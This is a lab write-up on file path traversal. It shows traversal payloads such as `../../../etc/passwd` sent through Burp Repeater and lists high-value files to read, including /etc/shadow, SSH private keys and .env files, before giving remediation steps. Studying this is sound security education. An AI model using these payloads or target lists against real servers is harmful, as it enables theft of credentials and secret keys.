# 🔥Lab-1 File Path Traversal – Full RAW Markdown Write-Up  
(Exact lab-style format + headings + symbols + screenshot placeholder)

---

## 1. 📝 One-Line Summary
Path Traversal allows an attacker to read arbitrary files on the server by escaping the intended directory using sequences like `../`.

---

## 2. ❓ What Is This Vulnerability?
Path traversal happens when:

1. The application loads a file based on **user input**.  
2. It **does not sanitize** path components.  
3. Attacker injects `../` to climb directories.  
4. Backend reads unintended files (e.g., `/etc/passwd`).  

Common vulnerable parameter:  
`filename=report.pdf` → attacker changes to → `filename=../../../../etc/passwd`

---

## 3. 🎯 Why This Matters
A single file inclusion can lead to:

- Source code disclosure  
- Credential leaks  
- SSH key theft  
- Exposing cloud environment variables  
- Reading internal configuration files  
- Privilege escalation  

Impact = **Critical**, especially when sensitive files exist.

---

## 4. 🔍 Real-World Scenarios

### • Linux Password File Exposure  
`../../../../etc/passwd`

### • Apache Config Leak  
`../../../etc/apache2/apache2.conf`

### • Windows Credential Theft  
`..\..\..\windows\win.ini`

### • Source Code Exposure  
`../../../var/www/app/config.php`

If logs are accessible, you can leak credentials, JWT secrets, DB passwords.

---

## 5. 🏗️ Step-By-Step Lab Walkthrough

### ✔ Step 1 — Visit Product Image Page
The lab loads images dynamically:  
`/image?filename=38.jpg`

### ✔ Step 2 — Send the request to Repeater
```
GET /image?filename=38.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

### ✔ Step 3 — Replace filename with traversal payload
```
GET /image?filename=../../../etc/passwd HTTP/2
```

### ✔ Step 4 — Send the request  
If vulnerable, server responds with the content of `/etc/passwd`.

### ✔ Step 5 — Confirm by checking markers  
Look for lines like:
```
root:x:0:0:root:/root:/bin/bash
```

### ✔ Step 6 — Lab is solved once `/etc/passwd` is retrieved.

---

## 6. 📸 Screenshot 

**Screenshot of Burp Repeater showing fetched /etc/passwd**

![path traversal to fetch passwords](../images/path-traversal-passwd.png)

---

## 7. 🧲 Common High-Value Files to Target

### 🟦 Linux Targets
- `/etc/passwd`  
- `/etc/shadow` (if readable)  
- `/var/www/html/config.php`  
- `/home/*/.ssh/id_rsa`

### 🟥 Windows Targets
- `C:\Windows\win.ini`  
- `C:\Windows\System32\drivers\etc\hosts`  
- `C:\Users\Administrator\.ssh\id_rsa`

### 🟨 App-Level Targets
- `.env`  
- `config.json`  
- `database.yml`  

---

## 8. 🔗 Multi-Chain Attack Possibilities
- Path Traversal → Read PHP config → DB creds → DB takeover  
- Path Traversal → Read SSH keys → Remote shell  
- Path Traversal → Leak JWT secret → Account takeover  
- Path Traversal → Source code disclosure → RCE via hidden endpoints  

---

## 9. 🛡️ Remediation
- Canonicalize + normalize paths  
- Enforce strict allowlisting of filenames  
- Strip sequences like `../` and `..\`  
- Disable direct filesystem access where possible  
- Use per-user virtual file systems or UUID-based filenames  

---

## 10. 📌 Final Summary
Path Traversal occurs when user input directly affects filesystem paths without sanitization. By replacing filenames with traversal sequences (`../`), attackers can read sensitive files like `/etc/passwd`, leak secrets, escalate privileges, or even achieve full server compromise.

---
